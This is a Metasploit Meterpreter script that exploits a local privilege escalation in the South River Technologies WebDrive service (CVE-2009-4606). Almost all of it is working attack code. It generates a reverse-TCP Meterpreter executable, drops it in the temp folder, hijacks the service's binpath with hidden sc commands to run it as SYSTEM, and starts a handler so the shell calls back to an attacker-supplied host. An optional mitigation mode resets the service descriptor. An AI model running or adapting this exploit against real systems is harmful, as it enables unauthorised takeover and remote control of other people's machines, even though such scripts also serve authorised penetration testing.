##
# South River Technologies WebDrive Service Bad Security Descriptor Local Privilege Escalation.
#
#  This module exploits a privilege escalation vulnerability in South River Technologies WebDrive.
#  Due to an empty security descriptor, a local attacker can gain elevated privileges.
#  Tested on South River Technologies WebDrive 9.02 build 2232 on Microsoft Windows XP SP3.
#  Vulnerability mitigation featured.
#
#  Credit:
#   - Discovery				- Nine:Situations:Group::bellick
#   - Meterpreter script	- Trancer
#
#  References:
#   - http://retrogod.altervista.org/9sg_south_river_priv.html
#   - http://www.rec-sec.com/2010/01/26/srt-webdrive-privilege-escalation/
#   - http://cve.mitre.org/cgi-bin/cvename.cgi?name=2009-4606
#   - http://osvdb.org/show/osvdb/59080
#
#  mtrancer[@]gmail.com
#  http://www.rec-sec.com
##

#
# Options
#
opts = Rex::Parser::Arguments.new(
  "-h"  => [ false,  "This help menu"],
  "-m"  => [ false,  "Mitigate"],
  "-r"  => [ true,   "The IP of the system running Metasploit listening for the connect back"],
  "-p"  => [ true,   "The port on the remote host where Metasploit is listening"]
)

#
# Default parameters
#

rhost = Rex::Socket.source_address("1.2.3.4")
rport = 4444
sname = 'WebDriveService'
pname = 'wdService.exe'

#check for proper Meterpreter Platform
def unsupported
  print_error("This version of Meterpreter is not supported with this Script!")
  raise Rex::Script::Completed
end
unsupported if client.platform !~ /win32|win64/i
#
# Option parsing
#
opts.parse(args) do |opt, idx, val|
  case opt
  when "-h"
    print_status("South River Technologies WebDrive Service Bad Security Descriptor Local Privilege Escalation.")
    print_line(opts.usage)
    raise Rex::Script::Completed
  when "-m"
    client.sys.process.get_processes().each do |m|
      if ( m['name'] == pname )
        print_status("Found vulnerable process #{m['name']} with pid #{m['pid']}.")

        # Set correct service security descriptor to mitigate the vulnerability
        print_status("Setting correct security descriptor for the South River Technologies WebDrive Service.")
        client.sys.process.execute("cmd.exe /c sc sdset \"#{sname}\" D:(A;;CCLCSWLOCRRC;;;AU)(A;;CCLCSWRPLOCRRC;;;PU)(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;BA)(A;;CCLCSWRPWPDTLOCRRC;;;SY)",
          nil, {'Hidden' => 'true'})
      end
    end
    raise Rex::Script::Completed
  when "-r"
    rhost = val
  when "-p"
    rport = val.to_i
  end
end

client.sys.process.get_processes().each do |m|
  if ( m['name'] == pname )

    print_status("Found vulnerable process #{m['name']} with pid #{m['pid']}.")

    # Build out the exe payload.
    pay = client.framework.payloads.create("windows/meterpreter/reverse_tcp")
    pay.datastore['LHOST'] = rhost
    pay.datastore['LPORT'] = rport
    raw  = pay.generate

    exe = Msf::Util::EXE.to_win32pe(client.framework, raw)

    # Place our newly created exe in %TEMP%
    tempdir = client.sys.config.getenv('TEMP')
    tempexe = tempdir + "\\" + Rex::Text.rand_text_alpha((rand(8)+6)) + ".exe"
    print_status("Sending EXE payload '#{tempexe}'.")
    fd = client.fs.file.new(tempexe, "wb")
    fd.write(exe)
    fd.close

    # Stop the vulnerable service
    print_status("Stopping service \"#{sname}\"...")
    client.sys.process.execute("cmd.exe /c sc stop \"#{sname}\" ", nil, {'Hidden' => 'true'})

    # Set exe payload as service binpath
    print_status("Setting \"#{sname}\" to #{tempexe}...")
    client.sys.process.execute("cmd.exe /c sc config \"#{sname}\" binpath= #{tempexe}", nil, {'Hidden' => 'true'})
    sleep(1)

    # Restart the service
    print_status("Restarting the \"#{sname}\" service...")
    client.sys.process.execute("cmd.exe /c sc start \"#{sname}\" ", nil, {'Hidden' => 'true'})

    # Our handler to recieve the callback.
    handler = client.framework.exploits.create("multi/handler")
    handler.datastore['WORKSPACE']      = client.workspace
    handler.datastore['PAYLOAD'] 		= "windows/meterpreter/reverse_tcp"
    handler.datastore['LHOST']   		= rhost
    handler.datastore['LPORT']   		= rport
    handler.datastore['ExitOnSession'] 	= false

    handler.exploit_simple(
      'Payload'	=> handler.datastore['PAYLOAD'],
      'RunAsJob'	=> true
    )

    # Set service binpath back to normal
    client.sys.process.execute("cmd.exe /c sc config \"#{sname}\" binpath= %ProgramFiles%\\WebDrive\\#{pname}", nil, {'Hidden' => 'true'})

  end
end

